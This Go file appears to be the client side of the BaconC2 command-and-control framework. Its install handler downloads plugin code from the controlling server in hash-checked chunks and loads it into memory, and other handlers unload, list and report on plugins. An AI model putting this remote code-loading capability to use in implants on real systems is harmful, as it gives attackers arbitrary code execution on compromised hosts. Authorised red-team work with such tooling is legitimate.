package plugins

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"

	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
	"github.com/RabbITCybErSeC/BaconC2/pkg/logging"
	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/plugins"
)

type ClientPluginCommands struct {
	manager *plugins.PluginManager
	fetcher transport.IPluginFetcher
}

func NewPluginCommands(manager *plugins.PluginManager, fetcher transport.IPluginFetcher) *ClientPluginCommands {
	return &ClientPluginCommands{
		manager: manager,
		fetcher: fetcher,
	}
}

func (pc *ClientPluginCommands) HandlePluginInstall(cmd models.Command) models.CommandResult {
	if len(cmd.Args) < 1 {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     "Error: plugin_install requires pluginName",
			ResultType: models.ResultTypeError,
		}
	}

	pluginName := cmd.Args[0]
	expectedHash := ""
	if len(cmd.Args) >= 2 {
		expectedHash = cmd.Args[1]
	}

	logging.Info("Fetching plugin metadata for '%s'", pluginName)
	metadata, err := pc.fetcher.FetchPluginMetadata(pluginName)
	if err != nil {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     fmt.Sprintf("Failed to fetch plugin metadata: %v", err),
			ResultType: models.ResultTypeError,
		}
	}

	if expectedHash != "" && metadata.Hash != expectedHash {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     fmt.Sprintf("Hash mismatch: expected %s, got %s", expectedHash, metadata.Hash),
			ResultType: models.ResultTypeError,
		}
	}

	logging.Info("Downloading plugin '%s' in %d chunks", pluginName, metadata.TotalChunks)
	pluginData := make([]byte, 0, metadata.TotalSize)

	for i := 0; i < metadata.TotalChunks; i++ {
		chunk, err := pc.fetcher.FetchPluginChunk(pluginName, i)
		if err != nil {
			return models.CommandResult{
				ID:         cmd.ID,
				Status:     models.CommandStatusFailed,
				Output:     fmt.Sprintf("Failed to fetch chunk %d/%d: %v", i+1, metadata.TotalChunks, err),
				ResultType: models.ResultTypeError,
			}
		}

		chunkData, err := base64.StdEncoding.DecodeString(chunk.Data)
		if err != nil {
			return models.CommandResult{
				ID:         cmd.ID,
				Status:     models.CommandStatusFailed,
				Output:     fmt.Sprintf("Failed to decode chunk %d: %v", i+1, err),
				ResultType: models.ResultTypeError,
			}
		}

		chunkHash := fmt.Sprintf("%x", sha256.Sum256(chunkData))
		if chunkHash != chunk.Hash {
			return models.CommandResult{
				ID:         cmd.ID,
				Status:     models.CommandStatusFailed,
				Output:     fmt.Sprintf("Chunk %d hash mismatch", i+1),
				ResultType: models.ResultTypeError,
			}
		}

		pluginData = append(pluginData, chunkData...)
		logging.Debug("Downloaded chunk %d/%d", i+1, metadata.TotalChunks)
	}

	actualHash := fmt.Sprintf("%x", sha256.Sum256(pluginData))
	if actualHash != metadata.Hash {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     fmt.Sprintf("Final hash mismatch: expected %s, got %s", metadata.Hash, actualHash),
			ResultType: models.ResultTypeError,
		}
	}

	if err := pc.manager.LoadPluginFromBytes(pluginName, pluginData); err != nil {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     fmt.Sprintf("Failed to load plugin: %v", err),
			ResultType: models.ResultTypeError,
		}
	}

	return models.CommandResult{
		ID:         cmd.ID,
		Status:     models.CommandStatusCompleted,
		Output:     fmt.Sprintf("Plugin '%s' installed successfully (%d bytes)", pluginName, len(pluginData)),
		ResultType: models.ResultTypeText,
	}
}

func (pc *ClientPluginCommands) HandlePluginUnload(cmd models.Command) models.CommandResult {
	if len(cmd.Args) == 0 {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     "Error: Plugin name required",
			ResultType: models.ResultTypeError,
		}
	}

	pluginName := cmd.Args[0]

	if err := pc.manager.UnloadPlugin(pluginName); err != nil {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     fmt.Sprintf("Failed to unload plugin '%s': %v", pluginName, err),
			ResultType: models.ResultTypeError,
		}
	}

	return models.CommandResult{
		ID:         cmd.ID,
		Status:     models.CommandStatusCompleted,
		Output:     fmt.Sprintf("Plugin '%s' unloaded successfully", pluginName),
		ResultType: models.ResultTypeText,
	}
}

func (pc *ClientPluginCommands) HandlePluginList(cmd models.Command) models.CommandResult {
	plugins := pc.manager.ListPlugins()

	if len(plugins) == 0 {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusCompleted,
			Output:     "No plugins loaded",
			ResultType: models.ResultTypeText,
		}
	}

	data, err := json.MarshalIndent(plugins, "", "  ")
	if err != nil {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     fmt.Sprintf("Failed to marshal plugin list: %v", err),
			ResultType: models.ResultTypeError,
		}
	}

	return models.CommandResult{
		ID:         cmd.ID,
		Status:     models.CommandStatusCompleted,
		Output:     string(data),
		ResultType: models.ResultTypeJSON,
	}
}

func (pc *ClientPluginCommands) HandlePluginStatus(cmd models.Command) models.CommandResult {
	if len(cmd.Args) == 0 {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     "Error: Plugin name required",
			ResultType: models.ResultTypeError,
		}
	}

	pluginName := cmd.Args[0]

	status, err := pc.manager.GetPluginStatus(pluginName)
	if err != nil {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     fmt.Sprintf("Failed to get plugin status: %v", err),
			ResultType: models.ResultTypeError,
		}
	}

	return models.CommandResult{
		ID:         cmd.ID,
		Status:     models.CommandStatusCompleted,
		Output:     fmt.Sprintf("Plugin '%s' status: %s", pluginName, status),
		ResultType: models.ResultTypeText,
	}
}

func (pc *ClientPluginCommands) HandlePluginInfo(cmd models.Command) models.CommandResult {
	if len(cmd.Args) == 0 {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     "Error: Plugin name required",
			ResultType: models.ResultTypeError,
		}
	}

	pluginName := cmd.Args[0]

	plugin, exists := pc.manager.GetRegistry().Get(pluginName)
	if !exists {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     fmt.Sprintf("Plugin '%s' not found", pluginName),
			ResultType: models.ResultTypeError,
		}
	}

	metadata := plugin.GetMetadata()
	data, err := json.MarshalIndent(metadata, "", "  ")
	if err != nil {
		return models.CommandResult{
			ID:         cmd.ID,
			Status:     models.CommandStatusFailed,
			Output:     fmt.Sprintf("Failed to marshal plugin info: %v", err),
			ResultType: models.ResultTypeError,
		}
	}

	return models.CommandResult{
		ID:         cmd.ID,
		Status:     models.CommandStatusCompleted,
		Output:     string(data),
		ResultType: models.ResultTypeJSON,
	}
}
